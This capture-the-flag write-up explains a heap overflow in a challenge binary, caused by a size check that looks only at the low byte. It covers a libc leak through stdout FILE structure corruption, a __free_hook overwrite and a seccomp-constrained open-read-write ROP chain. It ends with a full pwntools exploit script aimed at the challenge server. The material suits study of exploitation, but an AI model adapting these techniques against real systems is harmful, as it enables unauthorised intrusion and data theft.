#### Vim writeup

Solves - 4

This is a heap exploitation challenge.
We can perform two operations.

1. Allocate chunk
2. Delete chunk

### bug
While allocating the chunk. Allocate asks for Size to allocate. And it only checks for the least `significant byte to be <= 0x78`. 
```asm
call    return_number
mov     [rbp+size], eax
mov     eax, [rbp+size]
cmp     al, 78h ; 'x'
jle     short loc_DE1
```
While allocating the chunk. It will allocate the least significant byte of the size field. Giving size 0x178, will call `malloc(0x78)`.
```asm
text:0000000000000DE1 loc_DE1:                                ; CODE XREF: sub_D48+89â†‘j
.text:0000000000000DE1                 mov     eax, [rbp+size]
.text:0000000000000DE4                 movsx   rax, al
.text:0000000000000DE8                 mov     rdi, rax        ; size
.text:0000000000000DEB                 call    _malloc
```
The loophole here is that while reading data into the chunk. The read function will read the whole size field instead of least significante byte size. This creates a heap overflow.
```asm
.text:0000000000000E21                 lea     rdx, ds:0[rax*8]
.text:0000000000000E29                 lea     rax, CHUNK
.text:0000000000000E30                 mov     rax, [rdx+rax]
.text:0000000000000E34                 mov     edx, [rbp+size] /* <- Full size field /*
.text:0000000000000E37                 mov     esi, edx
.text:0000000000000E39                 mov     rdi, rax
.text:0000000000000E3C                 call    read_data
```
To leak libc. We need an unsorted bin on the heap. Which we can get by forging fake unsorted bin size chunk by changing the size field to > 0x411. Which we can overflow into the next chunk size field. And change the size to > 0x411. And free this chunk back to get an unsorted bin on the heap.
To leak libc address we partially overwrite the unsortedbin FD pointer to make it point at `_IO_2_1_stdout_` Which only requires 4 bits of libc bruteforce. Success rate becomes 1/16. 
Since we can overflow into the another chunk. We can partially overwrite FD to the unsortedbin address chunk. And we already partial overwrote FD of unsorted_bin to `_IO_2_1_stdout_`.

This way we can get allocation to the stdout file_stream. After getting stdout_file_stream.
Set flags to `stdout->_flags & _IO_IS_APPENDING `. `_IO_read_ptr` `_IO_read_end` `_IO_read_base` to `NULL`. Partial overwrite the last byte of `_IO_write_base` to `"\x00"`. The next call to puts will leak a whole bunch of libc addresses. After getting libc leaks. We can easily overflow into the next freed chunk FD and make it point to address we want to control.
However the binray implements seccomp. We can't directly get shell.
Here is the seccomp dump generated by Seccomp-tools https://github.com/david942j/seccomp-tools
```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
```
The seccomp allows us to open-read-write.
So we can open the flag file, read it and write it on stdout.
There is this other option in the jump table which allows us to read 0x10 bytes on the stack.
We change `__free_hook` to add rsp ; 0xa8 ; ROP gadget. And we send stack pivot rop chaing in 0x10 bytes max on the stack. Since we know the libc addresses. We can control the `__free_hook`and later of it. We can send other rop chain there to OPEN-READ-WRITE flag.

#### exploit
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

####Utils
def alloc(size, data):
	io.sendlineafter("Choice: ","1")
	io.sendlineafter("chunk: ",str(size))
	io.sendafter("note: ",data)

def free(idx):
	io.sendlineafter("Choice: ","2")
	io.sendlineafter("index: ",str(idx))

def sname(name):
	io.sendlineafter("Choice: ",str(0x1337))
	io.sendafter("book: ",name)

####Addr
IO_wide_data = 0x3eb780
free_hook = 0x3ed8e8
main_arena = 0x3ebc40

####Gadgets
add_rsp = 0x405af
pop_rdi = 0x1651ab
pop_rsi = 0x15eda7
pop_rdx = 0x130866
pop_rsp = 0x153fd6
mov_gad = 0x09c8cb
pop_r12 = 0x163705
pop_rbx = 0x166ab5
syscall = 0xe5c05
pop_rax = 0x10fedc
add_rsp_0x8 = 0x163862

####Heap overflow because of lacks of the size check and loophole while reading data.
####Exploit
while True:
	io = remote("vim.darkarmy.xyz",32768)
	for i in range(5):
		alloc(0x118,"HKHK") #0~4
	i = 4
	while i >= 0:
		free(i)
		i -= 1
	for i in range(5):
		alloc(0x178,"HKHK") #0~4
	for i in range(5):
		free(i)
	for i in range(2):
		alloc(0x168,"HKHK") #0~1
	alloc(0x168,p64(0x61)*7+p64(0x31))
	i = 2
	while i >= 0:
		free(i)
		i -= 1
	alloc(0x118,"HKHK") #0
	alloc(0x118,"HKHK") #1
	free(0)
	alloc(0x118,b"A"*0x18+p64(0x421)) #1
	free(1)
	free(0)
	alloc(0x118,b"A"*0x18+p64(0x421)+b"\x60"+p8(0x97)) #0
	alloc(0x118,b"A"*0x18+p64(0x21)+b"\x80") #1
	alloc(0x118,"HKHK") #2
	alloc(0x118,"HKHK") #3
	print("Now")
	try:
		alloc(0x118,p64(0xfbad1800)+p64(0x0)*3+b"\x00")#4
		libc_leak = u64(io.recvn(0x28)[0x20:0x28])
		libc_base = libc_leak - IO_wide_data
		if libc_base&0xfff==0:
			print("Found")
			break
	except:
		io.close()
		continue
print("Libc base: 0x%x"%libc_base)
free(0)
free(2)
alloc(0x168,p64(0x0)*13+p64(0x71)+p64(libc_base+free_hook)+p64(0x51)) #0
alloc(0x178,p64(0x0)*15+p64(0x81)) #2
free(0)
free(2)
alloc(0x168,"/home/ctf/flag\x00") #0
rop1 =  p64(libc_base+pop_rsi)+\
	p64(0x0)+\
	p64(libc_base+pop_rax)+\
	p64(0x2)+\
	p64(libc_base+pop_rdx)+\
	p64(0x50)+\
	p64(libc_base+syscall)+\
	p64(libc_base+pop_rax)+\
	p64(libc_base+add_rsp_0x8)+\
	p64(libc_base+mov_gad)+\
	p64(libc_base+pop_rdi)+\
	p64(0x3)+\
	p64(libc_base+pop_rax)+\
	p64(0x0)+\
	p64(libc_base+syscall)+\
	p64(libc_base+pop_rdi)+\
	p64(0x1)+\
	p64(libc_base+pop_rax)+\
	p64(0x1)+\
	p64(libc_base+syscall)
alloc(0x168,p64(libc_base+add_rsp)+rop1) #2
rop2 =  p64(libc_base+pop_rsp)+\
	p64(libc_base+free_hook+0x8)
sname(rop2)
free(0)
io.interactive()
```
